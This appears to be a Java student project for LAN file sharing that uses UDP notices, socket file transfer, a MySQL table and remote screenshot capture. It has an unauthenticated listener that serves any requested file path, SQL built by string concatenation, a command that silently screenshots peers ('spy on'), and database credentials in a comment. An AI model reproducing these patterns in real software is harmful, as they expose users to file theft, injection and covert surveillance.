package projetJava;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.ResultSet;
import java.util.Enumeration;

import javax.imageio.ImageIO;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;

public class CoolAsHeck {
	public static String whoamI = "";
	public static String amIRoot = "";
	public static String myIp = "";
	public static String rootIp = "";
	public static String[] myProject = { "prj1", "prj2", "prj3" };
	public static String[] MateIp = { "169.254.85.26", "169.254.202.52",
			"169.254.203.71" };
	public static String[] theSharedFiles;
	public static Boolean thereIsNewFiles = false;
	public static int nextPort = 10040;

	public CoolAsHeck() {
		// TODO Auto-generated constructor stub
		listIps();
	}

	// open file chooser you can choose just one file then dialog to choose the
	// project to share with,after that it execute an update query
	// "executeUpdateQuery"
	// then informEveryBodyOfNewSharedFiles
	public static void shareSomeFiles() {
		JFileChooser chooser = new JFileChooser();
		chooser.setMultiSelectionEnabled(true);
		int option = chooser.showOpenDialog(null);
		if (option == JFileChooser.APPROVE_OPTION) {
			File[] sf = chooser.getSelectedFiles();
			String filelist = "nothing";
			if (sf.length > 0) {
				filelist = sf[0].getName();
				String whichProject = (String) JOptionPane.showInputDialog(
						null, "Select which project you wanna share with:\n",
						"Share Some Files", JOptionPane.PLAIN_MESSAGE, null,
						myProject, myProject[0]);
				if ((whichProject != null) && (whichProject.length() > 0)) {
					System.out.println("Project: " + whichProject + "");
				}
				for (int i = 0; i < sf.length; i++) {
					String project = whichProject;
					String host = whoamI;
					String path = sf[i].getAbsolutePath();
					String query = "INSERT INTO `SharedFile` (`Id`, `project`, `owner`, `path`,`port`,`ownerIp` ,`fileName` ,`fileSize`) VALUES (NULL, '"
							+ project
							+ "', '"
							+ host
							+ "', '"
							+ path
							+ "', "
							+ nextPort
							+ ", '"
							+ myIp
							+ "', '"
							+ sf[i].getName() + "', " + sf[i].length() + ");";
					
					nextPort++;
					
					if(nextPort>=65000)return;
					
					executeUpdateQuery(query);
					
					informEveryBodyOfNewSharedFiles("NewSharedFiles|");
					
				}

			}
			System.out.println("You chose " + filelist);
		} else {
			System.out.println("You canceled.");
		}

	}

	// sends UpdateSharedFiles to MateIp ips array
	public static void informEveryBodyOfNewSharedFiles(String msg) {
		// TODO Auto-generated method stub
		for (int i = 0; i < MateIp.length; i++) {
			if (MateIp[i].equals(rootIp) == false) {
				// send("UpdateSharedFiles", MateIp[i]);
				send(msg, MateIp[i]);

			}
		}
	}

	// create in thread: datagramSocket server sends and receives to packets
	public static void send(final String notifStr, final String ip) {
		new Thread() {
			public void run() {
				System.out
						.println("sending(" + notifStr + ")==>" + ip + " ...");
				String[] s = ip.split("\\.");

				byte[] ipAddr = new byte[] { (byte) Integer.parseInt(s[0]),
						(byte) Integer.parseInt(s[1]),
						(byte) Integer.parseInt(s[2]),
						(byte) Integer.parseInt(s[3]) };

				try {
					DatagramSocket clientSocket = new DatagramSocket();

					InetAddress IPAddress = InetAddress.getByAddress(ipAddr);
					byte[] sendData = new byte[1024];
					byte[] receiveData = new byte[1024];

					sendData = (notifStr + "|").getBytes();
					DatagramPacket sendPacket = new DatagramPacket(sendData,
							sendData.length, IPAddress, 9876);
					clientSocket.send(sendPacket);
					DatagramPacket receivePacket = new DatagramPacket(
							receiveData, receiveData.length);
					clientSocket.receive(receivePacket);
					String modifiedSentence = new String(
							receivePacket.getData());
					System.out.println("from the other end:" + modifiedSentence
							+ ";");
					clientSocket.close();
				} catch (Exception e) {
					e.printStackTrace();
					System.out.println(e.getMessage());
				}
				return;
			}
		}.start();
	}

	// creates in thread ServerSocket with filePath at 13267 and waits for
	// connection any one who connects receives the file
	public static void CreateServerWaitForConnectionToBeRequested(
			final String filePath, final String port) {
		new Thread() {
			public final int SOCKET_PORT = Integer.parseInt(port);// 13267; //
																	// you may
																	// change
																	// this
			public final String FILE_TO_SEND = filePath; // you may change this

			public void run() {

				FileInputStream fis = null;
				BufferedInputStream bis = null;
				OutputStream os = null;
				ServerSocket servsock = null;
				Socket sock = null;
				try {
					servsock = new ServerSocket(SOCKET_PORT);
					System.out.println("server created");
					// while (true) {
					System.out.println("Waiting...");
					try {
						sock = servsock.accept();
						System.out.println("Accepted connection : " + sock);
						// send file
						File myFile = new File(FILE_TO_SEND);
						byte[] mybytearray = new byte[(int) myFile.length()];
						fis = new FileInputStream(myFile);
						bis = new BufferedInputStream(fis);
						bis.read(mybytearray, 0, mybytearray.length);
						os = sock.getOutputStream();
						System.out.println("Sending " + FILE_TO_SEND + "("
								+ mybytearray.length + " bytes)");
						os.write(mybytearray, 0, mybytearray.length);
						os.flush();
						System.out.println("Done.");
					} finally {
						if (bis != null)
							bis.close();
						if (os != null)
							os.close();
						if (sock != null)
							sock.close();
					}
					// }
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} finally {
					if (servsock != null)
						try {
							servsock.close();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
				}
				return;
			}

		}.start();
	}

	// a boolean attributes that controls the waitListenTakeAction Method
	static private boolean StopListening = false;

	// you can call it the main one create a datagramSocket server waits for
	// connection after connection take action(sentence) then repeat until
	// StopListening==True
	public static void waitListenTakeAction() {
		new Thread() {
			public void run() {
				try {
					DatagramSocket serverSocket = new DatagramSocket(10010);

					while (true) {
						byte[] receiveData = new byte[1024];
						byte[] sendData = new byte[1024];
						System.out.println("waitListenTakeAction...");
						DatagramPacket receivePacket = new DatagramPacket(
								receiveData, receiveData.length);
						serverSocket.receive(receivePacket);// *************************
						String sentence = new String(receivePacket.getData());
						System.out.println("RECEIVED: " + sentence);

						InetAddress IPAddress = receivePacket.getAddress();
						int port = receivePacket.getPort();
						String capitalizedSentence = takeAction(sentence) + "|";
						sendData = capitalizedSentence.getBytes();
						DatagramPacket sendPacket = new DatagramPacket(
								sendData, sendData.length, IPAddress, port);
						serverSocket.send(sendPacket);

						if (StopListening) {
							serverSocket.close();
							System.out.println("StopListening");
							Thread.currentThread().interrupt();
							return;
						}
					}
				} catch (Exception e) {
					e.printStackTrace();
				}

			}
		}.start();
	}

	// a switch method and it have 4 orders
	// File
	// ScreenShotRoot
	// GrabScreenShot
	// UpdateSharedFiles
	public static String takeAction(String request) {
		String sendBackNotif = "got it";
		String[] s = request.split("\\|");
		System.out.println(s[0]);
		if ("File".equals(s[0])) {

			CreateServerWaitForConnectionToBeRequested(s[1], s[2]);// filepath|port

		} else if ("ScreenShotRoot".equals(s[0])) {

			takeScreenShot();

			send("GrabScreenShot|" + myIp + "|" + "capture.jpg|10039|"
					+ picSize, rootIp);

		} else if ("GrabScreenShot".equals(s[0])) {

			try {
				File f = new File("capture.jpg");
				// tries to delete a non-existing file
				f.delete();
			} catch (Exception e) {
			}
			requestFile(s[1], s[2], s[3], s[4]);

			// } else if ("SqlNewSharedFiles".equals(s[0])) {
			// System.out.println(s[1]);
			// executeUpdateQuery(s[1]);
			//
			// String thenewFileList = stringContainsTheSharedFiles();
			// System.out.println(thenewFileList);
			// informEveryBodyOfNewSharedFiles("NewSharedFiles|" +
			// thenewFileList);

		} else if ("NewSharedFiles".equals(s[0])) {

			String theNewFiles[] = stringContainsTheSharedFiles().split("\\#");

			for (int i = 0; i < theNewFiles.length; i++) {
				System.out.println(theNewFiles[i]);
			}

			theSharedFiles = theNewFiles.clone();
			thereIsNewFiles = true;

		}
		return sendBackNotif;
	}

	// after receiving UpdateSharedFiles in takeAction Method there is a call
	// for this one to execute and update the SharedFile whatever structure
	public static String stringContainsTheSharedFiles() {
		String s = "";
		try {

			StringBuilder strBuilder = new StringBuilder();
			strBuilder.append("(");
			int i;
			for (i = 0; i < myProject.length - 1; i++) {
				strBuilder.append("\"");
				strBuilder.append(myProject[i]);
				strBuilder.append("\"");
				strBuilder.append(",");

			}
			strBuilder.append("\"");
			strBuilder.append(myProject[i]);
			strBuilder.append("\"");
			strBuilder.append(")");
			String strProjects = strBuilder.toString();
			System.out.println(strProjects);
			ResultSet rs = ConnectionDataBase
					.executeQuery("select * from SharedFile where project in "
							+ strProjects);

			while (rs.next()) {
				System.out.println("Id: " + rs.getInt("Id"));
				System.out.println("project: " + rs.getString("project"));
				System.out.println("owner: " + rs.getString("owner"));
				System.out.println("path: " + rs.getString("path"));
				s += "#" + rs.getInt("Id") + "," + rs.getString("project")
						+ "," + rs.getString("owner") + ","
						+ rs.getString("ownerIp") + ":" + rs.getString("port")
						+ "/" + rs.getString("fileName") + "/"
						+ rs.getString("fileSize");
				System.out.println(s);

			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return s;
	}

	// simple sql Method that executes any Insert into query :D
	public static void executeUpdateQuery(final String query) {
		new Thread() {
			public void run() {

				ConnectionDataBase.executeQuery(query);

				// "jdbc:mysql://mysql-javaproject.alwaysdata.net/javaproject_projetjava","121503","Java1234"

				// try {
				//
				// Class.forName("com.mysql.jdbc.Driver");
				// Connection cnx = DriverManager.getConnection(
				// "jdbc:mysql://" + "127.0.0.1" + "/topSecretBase",
				// "root", "mysql");
				// Statement st = cnx.createStatement();
				//
				// int result = st.executeUpdate(query);
				// if (result > 0)
				// System.out.println(result + " new Row :D");
				// else
				// System.out.println("Something went wrong");
				// } catch (Exception ex) {
				// System.out.println(ex.getMessage());
				// JOptionPane.showMessageDialog(null, "Erreur de connexion",
				// "SQL Studio", JOptionPane.ERROR_MESSAGE);
				// }
			}
		}.start();
	}

	//
	public static void init(String arg0, String arg1, String arg2, String arg3,
			String arg4, String arg5) {
		amIRoot = arg0;
		whoamI = arg1;
		myIp = arg2;
		rootIp = arg3;
		myProject = arg4.split("\\|");
		MateIp = arg5.split("\\|");
		System.out.println("Init:");
		System.out.println(amIRoot);
		System.out.println(whoamI);
		System.err.println(myIp);
		System.out.println(rootIp);
		for (int i = 0; i < myProject.length; i++)
			System.out.println(myProject[i]);
		for (int i = 0; i < MateIp.length; i++)
			System.out.println(MateIp[i]);

	}

	// method for testing and initializing needed fields :p
	public static void listIps() {
		try {
			Enumeration<NetworkInterface> e;

			e = NetworkInterface.getNetworkInterfaces();

			while (e.hasMoreElements()) {
				NetworkInterface n = (NetworkInterface) e.nextElement();
				Enumeration<InetAddress> ee = n.getInetAddresses();
				while (ee.hasMoreElements()) {
					InetAddress i = (InetAddress) ee.nextElement();
					System.out.println(i.getHostAddress());
				}
			}
		} catch (SocketException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
	}

	// creates in thread Server then sends request for fileOwner then sleeps for
	// 3 Mints after that it connects to a server that should created at the
	// moment in the owner PC to download the file
	// you can add some code to open any received images
	public static void requestFile(final String fileOwnerIp, String filePath,
			final String port, final String size) {

		send("File|" + filePath + "|" + port, fileOwnerIp);
		Path p = Paths.get(filePath);
		final String file = p.getFileName().toString();
		new Thread() {
			public final int SOCKET_PORT = Integer.parseInt(port);// 13267; //
																	// you may
																	// change
																	// this
			public final String SERVER = fileOwnerIp; // localhost
			public final String FILE_TO_RECEIVED = file;
			public final long FILE_SIZE = Integer.parseInt(size); // file size
																	// temporary

			// hard coded
			// should bigger
			// than the file to
			// be downloaded

			public void run() {
				try {
					Thread.currentThread();
					Thread.sleep(3000);
				} catch (InterruptedException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				int bytesRead;
				int current = 0;
				FileOutputStream fos = null;
				BufferedOutputStream bos = null;
				Socket sock = null;
				try {
					sock = new Socket(SERVER, SOCKET_PORT);
					System.out.println("Connecting...");

					// receive file
					byte[] mybytearray = new byte[(int) FILE_SIZE];
					InputStream is = sock.getInputStream();
					fos = new FileOutputStream(FILE_TO_RECEIVED);
					bos = new BufferedOutputStream(fos);
					bytesRead = is.read(mybytearray, 0, mybytearray.length);
					current = bytesRead;

					do {
						bytesRead = is.read(mybytearray, current,
								(mybytearray.length - current));
						if (bytesRead >= 0)
							current += bytesRead;
					} while (bytesRead > -1);

					bos.write(mybytearray, 0, current);
					bos.flush();
					System.out.println("File " + FILE_TO_RECEIVED
							+ " downloaded (" + current + " bytes read)");
				} catch (UnknownHostException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} finally {
					try {
						if (fos != null)
							fos.close();
						if (bos != null)
							bos.close();
						if (sock != null)
							sock.close();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				return;
			}

		}.start();

	}

	// sleeps for 1s then takes a screen shot to be saved as c.jpg
	static long picSize;

	public static void takeScreenShot() {

		new Thread() {
			public void run() {
				try {
					Thread.sleep(1000);
					Rectangle screenRect = new Rectangle(Toolkit
							.getDefaultToolkit().getScreenSize());
					BufferedImage capture = new Robot()
							.createScreenCapture(screenRect);

					try {
						File f = new File("capture.jpg");
						// tries to delete a non-existing file
						f.delete();
					} catch (Exception e) {
					}
					ImageIO.write(capture, "bmp", new File("capture.jpg"));
					File f = new File("capture.jpg");
					picSize = f.length();
				} catch (Exception e1) { // TODO Auto-generated catch block
					e1.printStackTrace();
				}
			}
		}.start();

	}

	// when root asks for screen shot from an IP it runs this code
	public static void rootGetScreenShotFromMate() {
		String whichMateIP = (String) JOptionPane.showInputDialog(null,
				"Select which mate you wanna spy on :p :\n", "GetScreenShot",
				JOptionPane.PLAIN_MESSAGE, null, MateIp, MateIp[0]);
		send("ScreenShotRoot", whichMateIP);
	}


	// it calls takeScreenShot then sends a grab flag
	public static void sendScreenShot() {

		String whichMateIP = (String) JOptionPane.showInputDialog(null,
				"Select which mate you wanna send ScShot to :D :\n",
				"sendScreenShot", JOptionPane.PLAIN_MESSAGE, null, MateIp,
				MateIp[0]);

		takeScreenShot();

		send("GrabScreenShot|" + myIp + "|" + "c.jpg|10039", whichMateIP);

	}
}
